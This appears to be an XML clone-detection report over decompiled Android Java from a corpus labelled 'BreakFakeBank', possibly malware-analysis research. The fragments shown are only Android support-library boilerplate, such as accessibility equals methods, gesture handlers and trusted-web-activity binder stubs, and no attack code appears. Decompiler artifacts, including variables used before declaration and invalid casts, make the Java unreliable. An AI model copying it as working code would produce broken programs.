      paramObject = paramObject;
      if (this.mInfo == null) {
        if (((AccessibilityNodeInfoCompat)paramObject).mInfo != null)
          bool = false; 
        return bool;
      } 
      if (!this.mInfo.equals(((AccessibilityNodeInfoCompat)paramObject).mInfo))
        bool = false; 
    } 
    return bool;
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/view/accessibility/AccessibilityRecordCompat.java" startline="26" endline="43" pcid="1068">
  public boolean equals(Object paramObject) {
    boolean bool = true;
    if (this != paramObject) {
      if (paramObject == null)
        return false; 
      if (getClass() != paramObject.getClass())
        return false; 
      paramObject = paramObject;
      if (this.mRecord == null) {
        if (((AccessibilityRecordCompat)paramObject).mRecord != null)
          bool = false; 
        return bool;
      } 
      if (!this.mRecord.equals(((AccessibilityRecordCompat)paramObject).mRecord))
        bool = false; 
    } 
    return bool;
  }
</source>
</class>

<class classid="19" nclones="2" nlines="15" similarity="76">
<source file="systems/BreakFakeBank/android/support/v4/view/GestureDetectorCompat.java" startline="772" endline="787" pcid="1319">
      public void handleMessage(Message param2Message) {
        switch (param2Message.what) {
          default:
            throw new RuntimeException("Unknown message " + param2Message);
          case 1:
            GestureDetectorCompat.GestureDetectorCompatImplBase.this.mListener.onShowPress(GestureDetectorCompat.GestureDetectorCompatImplBase.this.mCurrentDownEvent);
            return;
          case 2:
            GestureDetectorCompat.GestureDetectorCompatImplBase.this.dispatchLongPress();
            return;
          case 3:
            break;
        } 
        if (GestureDetectorCompat.GestureDetectorCompatImplBase.this.mDoubleTapListener != null && !GestureDetectorCompat.GestureDetectorCompatImplBase.this.mStillDown)
          GestureDetectorCompat.GestureDetectorCompatImplBase.this.mDoubleTapListener.onSingleTapConfirmed(GestureDetectorCompat.GestureDetectorCompatImplBase.this.mCurrentDownEvent); 
      }
</source>
<source file="systems/BreakFakeBank/android/support/v4/view/GestureDetectorCompat.java" startline="798" endline="813" pcid="1322">
    public void handleMessage(Message param1Message) {
      switch (param1Message.what) {
        default:
          throw new RuntimeException("Unknown message " + param1Message);
        case 1:
          this.this$0.mListener.onShowPress(this.this$0.mCurrentDownEvent);
          return;
        case 2:
          this.this$0.dispatchLongPress();
          return;
        case 3:
          break;
      } 
      if (this.this$0.mDoubleTapListener != null && !this.this$0.mStillDown)
        this.this$0.mDoubleTapListener.onSingleTapConfirmed(this.this$0.mCurrentDownEvent); 
    }
</source>
</class>

<class classid="20" nclones="2" nlines="29" similarity="80">
<source file="systems/BreakFakeBank/android/support/v4/view/AccessibilityDelegateCompatIcs.java" startline="13" endline="43" pcid="1413">
  public static Object newAccessibilityDelegateBridge(final AccessibilityDelegateBridge bridge) {
    return new View.AccessibilityDelegate() {
        public boolean dispatchPopulateAccessibilityEvent(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          return bridge.dispatchPopulateAccessibilityEvent(param1View, param1AccessibilityEvent);
        }
        
        public void onInitializeAccessibilityEvent(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          bridge.onInitializeAccessibilityEvent(param1View, param1AccessibilityEvent);
        }
        
        public void onInitializeAccessibilityNodeInfo(View param1View, AccessibilityNodeInfo param1AccessibilityNodeInfo) {
          bridge.onInitializeAccessibilityNodeInfo(param1View, param1AccessibilityNodeInfo);
        }
        
        public void onPopulateAccessibilityEvent(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          bridge.onPopulateAccessibilityEvent(param1View, param1AccessibilityEvent);
        }
        
        public boolean onRequestSendAccessibilityEvent(ViewGroup param1ViewGroup, View param1View, AccessibilityEvent param1AccessibilityEvent) {
          return bridge.onRequestSendAccessibilityEvent(param1ViewGroup, param1View, param1AccessibilityEvent);
        }
        
        public void sendAccessibilityEvent(View param1View, int param1Int) {
          bridge.sendAccessibilityEvent(param1View, param1Int);
        }
        
        public void sendAccessibilityEventUnchecked(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          bridge.sendAccessibilityEventUnchecked(param1View, param1AccessibilityEvent);
        }
      };
  }
</source>
<source file="systems/BreakFakeBank/android/support/v4/view/AccessibilityDelegateCompatJellyBean.java" startline="15" endline="53" pcid="1469">
  public static Object newAccessibilityDelegateBridge(final AccessibilityDelegateBridgeJellyBean bridge) {
    return new View.AccessibilityDelegate() {
        public boolean dispatchPopulateAccessibilityEvent(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          return bridge.dispatchPopulateAccessibilityEvent(param1View, param1AccessibilityEvent);
        }
        
        public AccessibilityNodeProvider getAccessibilityNodeProvider(View param1View) {
          return (AccessibilityNodeProvider)bridge.getAccessibilityNodeProvider(param1View);
        }
        
        public void onInitializeAccessibilityEvent(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          bridge.onInitializeAccessibilityEvent(param1View, param1AccessibilityEvent);
        }
        
        public void onInitializeAccessibilityNodeInfo(View param1View, AccessibilityNodeInfo param1AccessibilityNodeInfo) {
          bridge.onInitializeAccessibilityNodeInfo(param1View, param1AccessibilityNodeInfo);
        }
        
        public void onPopulateAccessibilityEvent(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          bridge.onPopulateAccessibilityEvent(param1View, param1AccessibilityEvent);
        }
        
        public boolean onRequestSendAccessibilityEvent(ViewGroup param1ViewGroup, View param1View, AccessibilityEvent param1AccessibilityEvent) {
          return bridge.onRequestSendAccessibilityEvent(param1ViewGroup, param1View, param1AccessibilityEvent);
        }
        
        public boolean performAccessibilityAction(View param1View, int param1Int, Bundle param1Bundle) {
          return bridge.performAccessibilityAction(param1View, param1Int, param1Bundle);
        }
        
        public void sendAccessibilityEvent(View param1View, int param1Int) {
          bridge.sendAccessibilityEvent(param1View, param1Int);
        }
        
        public void sendAccessibilityEventUnchecked(View param1View, AccessibilityEvent param1AccessibilityEvent) {
          bridge.sendAccessibilityEventUnchecked(param1View, param1AccessibilityEvent);
        }
      };
  }
</source>
</class>

<class classid="21" nclones="4" nlines="10" similarity="100">
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="88" endline="97" pcid="1528">
    public static boolean setDefaultImpl(ITrustedWebActivityService param1ITrustedWebActivityService) {
      if (Proxy.sDefaultImpl == null) {
        if (param1ITrustedWebActivityService != null) {
          Proxy.sDefaultImpl = param1ITrustedWebActivityService;
          return true;
        } 
        return false;
      } 
      throw new IllegalStateException("setDefaultImpl() called twice");
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityCallback.java" startline="40" endline="49" pcid="1556">
    public static boolean setDefaultImpl(ITrustedWebActivityCallback param1ITrustedWebActivityCallback) {
      if (Proxy.sDefaultImpl == null) {
        if (param1ITrustedWebActivityCallback != null) {
          Proxy.sDefaultImpl = param1ITrustedWebActivityCallback;
          return true;
        } 
        return false;
      } 
      throw new IllegalStateException("setDefaultImpl() called twice");
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="89" endline="98" pcid="1578">
    public static boolean setDefaultImpl(ITrustedWebActivityService param1ITrustedWebActivityService) {
      if (Proxy.sDefaultImpl == null) {
        if (param1ITrustedWebActivityService != null) {
          Proxy.sDefaultImpl = param1ITrustedWebActivityService;
          return true;
        } 
        return false;
      } 
      throw new IllegalStateException("setDefaultImpl() called twice");
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityCallback.java" startline="41" endline="50" pcid="1606">
    public static boolean setDefaultImpl(ITrustedWebActivityCallback param1ITrustedWebActivityCallback) {
      if (Proxy.sDefaultImpl == null) {
        if (param1ITrustedWebActivityCallback != null) {
          Proxy.sDefaultImpl = param1ITrustedWebActivityCallback;
          return true;
        } 
        return false;
      } 
      throw new IllegalStateException("setDefaultImpl() called twice");
    }
</source>
</class>

<class classid="22" nclones="2" nlines="90" similarity="98">
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="103" endline="196" pcid="1530">
    public boolean onTransact(int param1Int1, Parcel param1Parcel1, Parcel param1Parcel2, int param1Int2) {
      Bundle bundle4 = null;
      Bundle bundle5 = null;
      Bundle bundle2 = null;
      Bundle bundle3 = null;
      if (param1Int1 != 9) {
        if (param1Int1 != 1598968902) {
          switch (param1Int1) {
            default:
              return super.onTransact(param1Int1, param1Parcel1, param1Parcel2, param1Int2);
            case 7:
              param1Parcel1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle1 = getSmallIconBitmap();
              param1Parcel2.writeNoException();
              if (bundle1 != null) {
                param1Parcel2.writeInt(1);
                bundle1.writeToParcel(param1Parcel2, 1);
                return true;
              } 
              param1Parcel2.writeInt(0);
              return true;
            case 6:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle2 = bundle3;
              if (bundle1.readInt() != 0)
                bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
              bundle1 = areNotificationsEnabled(bundle2);
              param1Parcel2.writeNoException();
              if (bundle1 != null) {
                param1Parcel2.writeInt(1);
                bundle1.writeToParcel(param1Parcel2, 1);
                return true;
              } 
              param1Parcel2.writeInt(0);
              return true;
            case 5:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle1 = getActiveNotifications();
              param1Parcel2.writeNoException();
              if (bundle1 != null) {
                param1Parcel2.writeInt(1);
                bundle1.writeToParcel(param1Parcel2, 1);
                return true;
              } 
              param1Parcel2.writeInt(0);
              return true;
            case 4:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              param1Int1 = getSmallIconId();
              param1Parcel2.writeNoException();
              param1Parcel2.writeInt(param1Int1);
              return true;
            case 3:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle2 = bundle4;
              if (bundle1.readInt() != 0)
                bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
              cancelNotification(bundle2);
              param1Parcel2.writeNoException();
              return true;
            case 2:
              break;
          } 
          bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
          bundle2 = bundle5;
          if (bundle1.readInt() != 0)
            bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
          bundle1 = notifyNotificationWithChannel(bundle2);
          param1Parcel2.writeNoException();
          if (bundle1 != null) {
            param1Parcel2.writeInt(1);
            bundle1.writeToParcel(param1Parcel2, 1);
            return true;
          } 
          param1Parcel2.writeInt(0);
          return true;
        } 
        param1Parcel2.writeString("android.support.customtabs.trusted.ITrustedWebActivityService");
        return true;
      } 
      bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
      String str = bundle1.readString();
      if (bundle1.readInt() != 0)
        bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
      Bundle bundle1 = extraCommand(str, bundle2, bundle1.readStrongBinder());
      param1Parcel2.writeNoException();
      if (bundle1 != null) {
        param1Parcel2.writeInt(1);
        bundle1.writeToParcel(param1Parcel2, 1);
        return true;
      } 
      param1Parcel2.writeInt(0);
      return true;
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="104" endline="197" pcid="1580">
    public boolean onTransact(int param1Int1, Parcel param1Parcel1, Parcel param1Parcel2, int param1Int2) throws RemoteException {
      Bundle bundle4 = null;
      Bundle bundle5 = null;
      Bundle bundle2 = null;
      Bundle bundle3 = null;
      if (param1Int1 != 9) {
        if (param1Int1 != 1598968902) {
          switch (param1Int1) {
            default:
              return super.onTransact(param1Int1, param1Parcel1, param1Parcel2, param1Int2);
            case 7:
              param1Parcel1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle1 = getSmallIconBitmap();
              param1Parcel2.writeNoException();
              if (bundle1 != null) {
                param1Parcel2.writeInt(1);
                bundle1.writeToParcel(param1Parcel2, 1);
                return true;
              } 
              param1Parcel2.writeInt(0);
              return true;
            case 6:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle2 = bundle3;
              if (bundle1.readInt() != 0)
                bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
              bundle1 = areNotificationsEnabled(bundle2);
              param1Parcel2.writeNoException();
              if (bundle1 != null) {
                param1Parcel2.writeInt(1);
                bundle1.writeToParcel(param1Parcel2, 1);
                return true;
              } 
              param1Parcel2.writeInt(0);
              return true;
            case 5:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle1 = getActiveNotifications();
              param1Parcel2.writeNoException();
              if (bundle1 != null) {
                param1Parcel2.writeInt(1);
                bundle1.writeToParcel(param1Parcel2, 1);
                return true;
              } 
              param1Parcel2.writeInt(0);
              return true;
            case 4:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              param1Int1 = getSmallIconId();
              param1Parcel2.writeNoException();
              param1Parcel2.writeInt(param1Int1);
              return true;
            case 3:
              bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
              bundle2 = bundle4;
              if (bundle1.readInt() != 0)
                bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
              cancelNotification(bundle2);
              param1Parcel2.writeNoException();
              return true;
            case 2:
              break;
          } 
          bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
          bundle2 = bundle5;
          if (bundle1.readInt() != 0)
            bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
          bundle1 = notifyNotificationWithChannel(bundle2);
          param1Parcel2.writeNoException();
          if (bundle1 != null) {
            param1Parcel2.writeInt(1);
            bundle1.writeToParcel(param1Parcel2, 1);
            return true;
          } 
          param1Parcel2.writeInt(0);
          return true;
        } 
        param1Parcel2.writeString("android.support.customtabs.trusted.ITrustedWebActivityService");
        return true;
      } 
      bundle1.enforceInterface("android.support.customtabs.trusted.ITrustedWebActivityService");
      String str = bundle1.readString();
      if (bundle1.readInt() != 0)
        bundle2 = (Bundle)Bundle.CREATOR.createFromParcel((Parcel)bundle1); 
      Bundle bundle1 = extraCommand(str, bundle2, bundle1.readStrongBinder());
      param1Parcel2.writeNoException();
      if (bundle1 != null) {
        param1Parcel2.writeInt(1);
        bundle1.writeToParcel(param1Parcel2, 1);
        return true;
      } 
      param1Parcel2.writeInt(0);
      return true;
    }
</source>
</class>

<class classid="23" nclones="12" nlines="29" similarity="72">
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="207" endline="233" pcid="1532">
      public Bundle areNotificationsEnabled(Bundle param2Bundle) {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(6, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            param2Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().areNotificationsEnabled(param2Bundle);
            return param2Bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            param2Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            param2Bundle = null;
          } 
          return param2Bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="356" endline="382" pcid="1590">
      public Bundle notifyNotificationWithChannel(Bundle param2Bundle) throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            param2Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().notifyNotificationWithChannel(param2Bundle);
            return param2Bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            param2Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            param2Bundle = null;
          } 
          return param2Bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="262" endline="288" pcid="1535">
      public Bundle extraCommand(String param2String, Bundle param2Bundle, IBinder param2IBinder) {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          parcel1.writeString(param2String);
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          parcel1.writeStrongBinder(param2IBinder);
          if (!this.mRemote.transact(9, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
            return ITrustedWebActivityService.Stub.getDefaultImpl().extraCommand(param2String, param2Bundle, param2IBinder); 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            Bundle bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            param2String = null;
          } 
          return (Bundle)param2String;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="395" endline="421" pcid="1592">
    public Bundle areNotificationsEnabled(Bundle param1Bundle) throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(6, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          param1Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().areNotificationsEnabled(param1Bundle);
          return param1Bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          param1Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          param1Bundle = null;
        } 
        return param1Bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="543" endline="569" pcid="1600">
    public Bundle notifyNotificationWithChannel(Bundle param1Bundle) throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          param1Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().notifyNotificationWithChannel(param1Bundle);
          return param1Bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          param1Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          param1Bundle = null;
        } 
        return param1Bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="355" endline="381" pcid="1540">
      public Bundle notifyNotificationWithChannel(Bundle param2Bundle) {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            param2Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().notifyNotificationWithChannel(param2Bundle);
            return param2Bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            param2Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            param2Bundle = null;
          } 
          return param2Bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="394" endline="420" pcid="1542">
    public Bundle areNotificationsEnabled(Bundle param1Bundle) {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(6, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          param1Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().areNotificationsEnabled(param1Bundle);
          return param1Bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          param1Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          param1Bundle = null;
        } 
        return param1Bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="449" endline="475" pcid="1545">
    public Bundle extraCommand(String param1String, Bundle param1Bundle, IBinder param1IBinder) {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        parcel1.writeString(param1String);
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        parcel1.writeStrongBinder(param1IBinder);
        if (!this.mRemote.transact(9, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
          return ITrustedWebActivityService.Stub.getDefaultImpl().extraCommand(param1String, param1Bundle, param1IBinder); 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          Bundle bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          param1String = null;
        } 
        return (Bundle)param1String;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="542" endline="568" pcid="1550">
    public Bundle notifyNotificationWithChannel(Bundle param1Bundle) {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          param1Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().notifyNotificationWithChannel(param1Bundle);
          return param1Bundle;
        } 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          param1Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          param1Bundle = null;
        } 
        return param1Bundle;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="450" endline="476" pcid="1595">
    public Bundle extraCommand(String param1String, Bundle param1Bundle, IBinder param1IBinder) throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        parcel1.writeString(param1String);
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        parcel1.writeStrongBinder(param1IBinder);
        if (!this.mRemote.transact(9, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
          return ITrustedWebActivityService.Stub.getDefaultImpl().extraCommand(param1String, param1Bundle, param1IBinder); 
        parcel2.readException();
        if (parcel2.readInt() != 0) {
          Bundle bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
        } else {
          param1String = null;
        } 
        return (Bundle)param1String;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="208" endline="234" pcid="1582">
      public Bundle areNotificationsEnabled(Bundle param2Bundle) throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(6, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            param2Bundle = ITrustedWebActivityService.Stub.getDefaultImpl().areNotificationsEnabled(param2Bundle);
            return param2Bundle;
          } 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            param2Bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            param2Bundle = null;
          } 
          return param2Bundle;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityService.java" startline="263" endline="289" pcid="1585">
      public Bundle extraCommand(String param2String, Bundle param2Bundle, IBinder param2IBinder) throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          parcel1.writeString(param2String);
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          parcel1.writeStrongBinder(param2IBinder);
          if (!this.mRemote.transact(9, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null)
            return ITrustedWebActivityService.Stub.getDefaultImpl().extraCommand(param2String, param2Bundle, param2IBinder); 
          parcel2.readException();
          if (parcel2.readInt() != 0) {
            Bundle bundle = (Bundle)Bundle.CREATOR.createFromParcel(parcel2);
          } else {
            param2String = null;
          } 
          return (Bundle)param2String;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
</class>

<class classid="24" nclones="8" nlines="23" similarity="84">
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="239" endline="260" pcid="1534">
      public void cancelNotification(Bundle param2Bundle) {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
          if (param2Bundle != null) {
            parcel1.writeInt(1);
            param2Bundle.writeToParcel(parcel1, 0);
          } else {
            parcel1.writeInt(0);
          } 
          if (!this.mRemote.transact(3, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
            ITrustedWebActivityService.Stub.getDefaultImpl().cancelNotification(param2Bundle);
            return;
          } 
          parcel2.readException();
          return;
        } finally {
          parcel2.recycle();
          parcel1.recycle();
        } 
      }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityCallback.java" startline="135" endline="157" pcid="1616">
    public void onExtraCallback(String param1String, Bundle param1Bundle) throws RemoteException {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityCallback");
        parcel1.writeString(param1String);
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(2, parcel1, parcel2, 0) && ITrustedWebActivityCallback.Stub.getDefaultImpl() != null) {
          ITrustedWebActivityCallback.Stub.getDefaultImpl().onExtraCallback(param1String, param1Bundle);
          return;
        } 
        parcel2.readException();
        return;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Postermaker/ITrustedWebActivityService.java" startline="426" endline="447" pcid="1544">
    public void cancelNotification(Bundle param1Bundle) {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      try {
        parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityService");
        if (param1Bundle != null) {
          parcel1.writeInt(1);
          param1Bundle.writeToParcel(parcel1, 0);
        } else {
          parcel1.writeInt(0);
        } 
        if (!this.mRemote.transact(3, parcel1, parcel2, 0) && ITrustedWebActivityService.Stub.getDefaultImpl() != null) {
          ITrustedWebActivityService.Stub.getDefaultImpl().cancelNotification(param1Bundle);
          return;
        } 
        parcel2.readException();
        return;
      } finally {
        parcel2.recycle();
        parcel1.recycle();
      } 
    }
</source>
<source file="systems/BreakFakeBank/Newsmax/ITrustedWebActivityCallback.java" startline="92" endline="114" pcid="1612">
      public void onExtraCallback(String param2String, Bundle param2Bundle) throws RemoteException {
        Parcel parcel1 = Parcel.obtain();
        Parcel parcel2 = Parcel.obtain();
        try {
          parcel1.writeInterfaceToken("android.support.customtabs.trusted.ITrustedWebActivityCallback");
          parcel1.writeString(param2String);
          if (param2Bundle != null) {
